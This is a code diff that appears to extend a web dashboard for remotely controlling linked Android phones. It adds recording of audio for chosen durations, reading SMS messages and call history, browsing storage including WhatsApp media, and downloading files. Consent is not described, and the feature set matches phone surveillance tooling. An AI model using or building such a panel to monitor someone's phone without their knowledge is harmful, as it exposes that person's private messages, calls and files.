@@ -49,6 +49,14 @@
   .gal-h{color:var(--cyan); font-weight:600; font-size:.95rem; margin-top:16px; border-top:1px solid var(--stroke); padding-top:12px}
   .gal-img{width:100%; border-radius:12px; border:1px solid var(--stroke); margin-top:4px; display:block; background:#0a1c14; min-height:60px}
   audio{margin-top:4px}
+  .panel{margin-top:4px}
+  .li{background:#0a1c14; border:1px solid var(--stroke); border-radius:10px; padding:9px 11px; margin-top:7px}
+  .li-click{cursor:pointer}
+  .li-top{display:flex; align-items:center; gap:7px; font-size:13px; color:var(--fg)}
+  .li-top .muted{margin-left:auto; font-size:11px}
+  .li-body{font-size:12px; color:#cff3e4; margin-top:4px; word-break:break-word}
+  input[type=number]{width:100%}
+  video{border-radius:12px; width:100%}
   .hint{font-size:.78rem; color:var(--dim); margin-top:10px; line-height:1.45}
   footer{font-size:.74rem; color:var(--dim); text-align:center; margin:18px 0 6px; line-height:1.5}
 </style>
@@ -240,16 +248,25 @@ function render(devs){
       `<div class="dev-name">${online?"🟢":"⚪"} ${esc(d.name||"Phone")}<span class="dev-sub">${seen}</span></div>` +
       (stat.length ? `<div class="dev-stat">${stat.join("   ")}</div>` : "") +
       (("lat" in s) ? `<a class="loc" target="_blank" rel="noopener" href="https://www.google.com/maps/search/?api=1&query=${s.lat},${s.lon}">📍 View location${s.loc_age_min?` (${s.loc_age_min} min old)`:""}</a>` : "");
+    const panel = document.createElement("div"); panel.className="panel";
     const r1 = document.createElement("div"); r1.className="row";
-    r1.append(mkBtn("🔔 Ring",()=>cmd(d,"ring")), mkBtn("📍 Locate",()=>cmd(d,"locate")), mkBtn("↻ Status",()=>cmd(d,"status")));
+    r1.append(mkBtn("🔔 Ring",()=>cmd(d,"ring")), mkBtn("📍 Locate",()=>cmd(d,"locate")), mkBtn("🔄 Status",()=>cmd(d,"status")));
     const r2 = document.createElement("div"); r2.className="row";
-    r2.append(mkBtn("📷 Back",()=>cmd(d,"photo_back")), mkBtn("🤳 Front",()=>cmd(d,"photo_front")), mkBtn("🎙 15s",()=>cmd(d,"record",{sec:15})));
-    const gal = document.createElement("div");
+    r2.append(
+      mkBtn("📷 Back",()=>cmd(d,"photo_back")),
+      mkBtn("🤳 Front",()=>cmd(d,"photo_front")),
+      mkBtn("🎙 Audio",()=>pickDuration(panel,"Audio",sec=>cmd(d,"record",{sec})))
+    );
     const r3 = document.createElement("div"); r3.className="row";
-    r3.append(mkBtn("🖼 View photos / recordings",()=>openGallery(d, gal)));
-    el.append(r1,r2,r3,gal);
+    r3.append(
+      mkBtn("💬 Messages",()=>openMessages(d,panel)),
+      mkBtn("📞 Calls",()=>openCalls(d,panel)),
+      mkBtn("📂 Files",()=>openFiles(d,panel,"")),
+      mkBtn("🖼 Gallery",()=>openGallery(d,panel))
+    );
+    el.append(r1,r2,r3,panel);
     const note = document.createElement("div"); note.className="hint";
-    note.textContent = "When you request a photo/recording, that phone shows a notification, sound and a green dot. After a few seconds open the gallery.";
+    note.textContent = "Camera/mic/screen tasks show a notification, sound and a green dot on that phone. Results open below.";
     el.append(note);
     list.append(el);
   });
@@ -273,6 +290,142 @@ async function cmd(d, type, args){
     setChip(r.ok ? "SENT" : "ERROR", r.ok ? "#1b8f5c" : "#ff5c7a");
     setTimeout(()=>setChip("LINKED","#3df5c4"), 2500);
   }catch(e){ if (e.message==="login") logout(); }
+}
+
+// ---- command + wait for result ----
+async function sendWait(d, type, args, panel, loadingText){
+  if (panel) panel.innerHTML = '<div class="muted" style="margin-top:10px">'+(loadingText||"Working…")+'</div>';
+  const body = { target:d.device_id, type };
+  if (args) body.args = args;
+  const r = await api("/rest/v1/aj_commands", {
+    method:"POST",
+    headers:{ "Content-Type":"application/json", "Prefer":"return=representation" },
+    body: JSON.stringify(body)
+  });
+  if (!r.ok) return null;
+  const rows = await r.json();
+  const id = rows[0] && rows[0].id;
+  if (!id) return null;
+  for (let i=0;i<40;i++){
+    await new Promise(res=>setTimeout(res,2000));
+    const rr = await api("/rest/v1/aj_commands?select=state,result&id=eq."+id);
+    const jr = await rr.json();
+    if (jr[0] && jr[0].state==="done") return jr[0].result||{};
+  }
+  return null;
+}
+
+function fmtTime2(ms){ try{ return new Date(Number(ms)).toLocaleString(); }catch(e){ return ""; } }
+function fmtSize(b){ b=Number(b)||0; if(b<1024)return b+" B"; if(b<1048576)return (b/1024).toFixed(0)+" KB"; if(b<1073741824)return (b/1048576).toFixed(1)+" MB"; return (b/1073741824).toFixed(2)+" GB"; }
+function fileIcon(n){ n=(n||"").toLowerCase(); if(/\.(jpg|jpeg|png|gif|webp|heic)$/.test(n))return "🖼️"; if(/\.(mp4|mkv|3gp|mov|avi|webm)$/.test(n))return "🎬"; if(/\.(mp3|m4a|aac|opus|ogg|wav)$/.test(n))return "🎵"; if(/\.pdf$/.test(n))return "📄"; if(/\.(doc|docx|xls|xlsx|ppt|pptx|txt)$/.test(n))return "📝"; if(/\.(zip|rar|7z)$/.test(n))return "🗜️"; return "📎"; }
+
+function pickDuration(panel, label, cb){
+  panel.innerHTML='<div class="gal-h">'+(label==="Video"?"🎥":"🎙")+' '+label+" — how long?</div>";
+  const choose=sec=>{ cb(sec); panel.innerHTML='<div class="muted" style="margin-top:10px">Requested '+Math.round(sec/60)+' min '+label.toLowerCase()+'. It will appear in 🖼 Gallery when done.</div>'; };
+  const grid=document.createElement("div"); grid.className="row";
+  [1,2,5,10,15,30,60].forEach(m=>grid.append(mkBtn(m+" min",()=>choose(m*60))));
+  panel.append(grid);
+  const wrap=document.createElement("div"); wrap.style.display="flex"; wrap.style.gap="8px"; wrap.style.marginTop="10px"; wrap.style.alignItems="center";
+  const inp=document.createElement("input"); inp.type="number"; inp.min="1"; inp.placeholder="minutes";
+  const go=document.createElement("button"); go.className="primary"; go.textContent="Start";
+  go.addEventListener("click",()=>{ const m=parseInt(inp.value,10); if(!m||m<1){ inp.focus(); return; } choose(m*60); });
+  wrap.append(inp,go); panel.append(wrap);
+  const note=document.createElement("div"); note.className="hint"; note.textContent="That phone "+(label==="Video"?"records video":"records audio")+" for this long, then it appears in Gallery.";
+  panel.append(note);
+}
+
+async function openMessages(d,panel){
+  try{
+    const res = await sendWait(d,"sms",null,panel,"Fetching messages… (phone must be online)");
+    if (!res){ panel.innerHTML='<div class="muted" style="margin-top:10px">No answer. Is that phone online?</div>'; return; }
+    if (!res.ok){ panel.innerHTML='<div class="muted" style="margin-top:10px">'+esc(res.error||"Could not read messages")+'</div>'; return; }
+    const list=res.list||[];
+    panel.innerHTML='<div class="gal-h">💬 Messages ('+list.length+')</div>';
+    if(!list.length){ panel.append(Object.assign(document.createElement("div"),{className:"muted",textContent:"No messages."})); return; }
+    list.forEach(m=>{ const row=document.createElement("div"); row.className="li";
+      row.innerHTML='<div class="li-top"><b>'+esc(m.from||"?")+'</b><span class="muted">'+fmtTime2(m.time)+'</span></div><div class="li-body">'+esc(m.body||"")+'</div>';
+      panel.append(row); });
+  }catch(e){ if(e.message==="login") logout(); else panel.innerHTML='<div class="muted" style="margin-top:10px">Error.</div>'; }
+}
+
+async function openCalls(d,panel){
+  try{
+    const res = await sendWait(d,"calls",null,panel,"Fetching call history… (phone must be online)");
+    if (!res){ panel.innerHTML='<div class="muted" style="margin-top:10px">No answer. Is that phone online?</div>'; return; }
+    if (!res.ok){ panel.innerHTML='<div class="muted" style="margin-top:10px">'+esc(res.error||"Could not read calls")+'</div>'; return; }
+    const list=res.list||[]; const ic={in:"📥",out:"📤",missed:"❌",rejected:"⛔",other:"•"};
+    panel.innerHTML='<div class="gal-h">📞 Call history ('+list.length+')</div>';
+    if(!list.length){ panel.append(Object.assign(document.createElement("div"),{className:"muted",textContent:"No calls."})); return; }
+    list.forEach(c=>{ const row=document.createElement("div"); row.className="li"; const dur=c.dur?(" • "+c.dur+"s"):"";
+      row.innerHTML='<div class="li-top">'+(ic[c.type]||"•")+' <b>'+esc(c.name||c.number)+'</b><span class="muted">'+fmtTime2(c.time)+'</span></div><div class="muted">'+esc(c.type)+dur+((c.name&&c.name!==c.number)?(" • "+esc(c.number)):"")+'</div>';
+      panel.append(row); });
+  }catch(e){ if(e.message==="login") logout(); else panel.innerHTML='<div class="muted" style="margin-top:10px">Error.</div>'; }
+}
+
+function fileShortcuts(){ const b="/storage/emulated/0"; return [
+  {name:"⬇️ Downloads", path:b+"/Download"},
+  {name:"🖼️ Gallery (DCIM)", path:b+"/DCIM"},
+  {name:"📸 Pictures", path:b+"/Pictures"},
+  {name:"🎬 Movies", path:b+"/Movies"},
+  {name:"💬 WhatsApp", path:b+"/Android/media/com.whatsapp/WhatsApp/Media"},
+  {name:"🗂️ All storage", path:b} ]; }
+
+async function openFiles(d,panel,path){
+  try{
+    if (!path){
+      panel.innerHTML='<div class="gal-h">📂 Files</div>';
+      fileShortcuts().forEach(sc=>{ const row=document.createElement("div"); row.className="li li-click";
+        row.innerHTML='<div class="li-top"><b>'+sc.name+'</b><span class="muted">›</span></div>';
+        row.addEventListener("click",()=>openFiles(d,panel,sc.path)); panel.append(row); });
+      return;
+    }
+    const res = await sendWait(d,"list_dir",{path},panel,"Opening folder… (phone must be online)");
+    if (!res){ panel.innerHTML='<div class="muted" style="margin-top:10px">No answer. Is that phone online?</div>'; backBtn(d,panel,""); return; }
+    if (!res.ok){ panel.innerHTML='<div class="muted" style="margin-top:10px">'+esc(res.error||"Could not open")+'</div>'; backBtn(d,panel,""); return; }
+    panel.innerHTML="";
+    const bar=document.createElement("div"); bar.className="muted"; bar.style.wordBreak="break-all"; bar.style.marginBottom="6px"; bar.textContent="🗂️ "+res.path; panel.append(bar);
+    backBtn(d,panel,res.parent||"");
+    (res.dirs||[]).forEach(f=>{ const row=document.createElement("div"); row.className="li li-click";
+      row.innerHTML='<div class="li-top">📁 <b>'+esc(f.name)+'</b><span class="muted">›</span></div>';
+      row.addEventListener("click",()=>openFiles(d,panel,f.path)); panel.append(row); });
+    (res.files||[]).forEach(f=>{ const row=document.createElement("div"); row.className="li";
+      row.innerHTML='<div class="li-top">'+fileIcon(f.name)+' <b>'+esc(f.name)+'</b></div><div class="muted">'+fmtSize(f.size)+' • '+fmtTime2(f.mtime)+'</div>';
+      const act=document.createElement("div"); act.className="row"; act.style.marginTop="6px";
+      act.append(mkBtn("👁 Preview",()=>pullFile(d,panel,f,true,res.path)), mkBtn("⬇ Download",()=>pullFile(d,panel,f,false,res.path)));
+      row.append(act); panel.append(row); });
+    if(!(res.dirs||[]).length && !(res.files||[]).length) panel.append(Object.assign(document.createElement("div"),{className:"muted",textContent:"Empty folder."}));
+  }catch(e){ if(e.message==="login") logout(); else panel.innerHTML='<div class="muted" style="margin-top:10px">Error.</div>'; }
+}
+
+function backBtn(d,panel,toPath){ const b=document.createElement("button"); b.textContent="← Back"; b.style.marginBottom="8px"; b.addEventListener("click",()=>openFiles(d,panel,toPath)); panel.append(b); }
+
+async function pullFile(d,panel,f,preview,folderPath){
+  const tip=document.createElement("div"); tip.className="muted"; tip.style.marginTop="8px"; tip.textContent="Fetching "+f.name+"…"; panel.append(tip);
+  try{
+    const res = await sendWait(d,"pull_file",{path:f.path},null);
+    if (!res || !res.ok){ tip.textContent=(res&&res.error)||"Could not fetch (phone offline or file too big)"; return; }
+    const url = await sign(res.path); if(!url){ tip.textContent="Could not create link"; return; }
+    tip.remove();
+    if (preview) showPreview(panel, f.name, url, res.mime||"", ()=>openFiles(d,panel,folderPath||""));
+    else { const a=document.createElement("a"); a.href=url; a.download=f.name; document.body.append(a); a.click(); a.remove();
+      const t=document.createElement("div"); t.className="muted"; t.style.marginTop="8px"; t.textContent="⬇ Downloaded "+f.name; panel.append(t); }
+  }catch(e){ if(e.message==="login") logout(); else tip.textContent="Error."; }
+}
+
+function showPreview(panel,name,url,mime,onClose){
+  panel.innerHTML="";
+  const top=document.createElement("div"); top.className="muted"; top.style.marginBottom="8px";
+  const close=document.createElement("button"); close.textContent="← Back"; close.addEventListener("click",onClose);
+  top.append(close, document.createTextNode("  "+name)); panel.append(top);
+  let view;
+  if (mime.indexOf("image/")===0){ view=document.createElement("img"); view.className="gal-img"; view.src=url; }
+  else if (mime.indexOf("video/")===0){ view=document.createElement("video"); view.controls=true; view.src=url; }
+  else if (mime.indexOf("audio/")===0){ view=document.createElement("audio"); view.controls=true; view.src=url; view.style.width="100%"; }
+  else { view=document.createElement("div"); view.className="muted"; view.innerHTML='Preview not supported here. <a href="'+url+'" target="_blank" rel="noopener">Open ↗</a>'; }
+  panel.append(view);
+  const dl=document.createElement("button"); dl.textContent="⬇ Download"; dl.style.marginTop="10px";
+  dl.addEventListener("click",()=>{ const a=document.createElement("a"); a.href=url; a.download=name; document.body.append(a); a.click(); a.remove(); });
+  panel.append(dl);
 }
 
 async function sign(path){
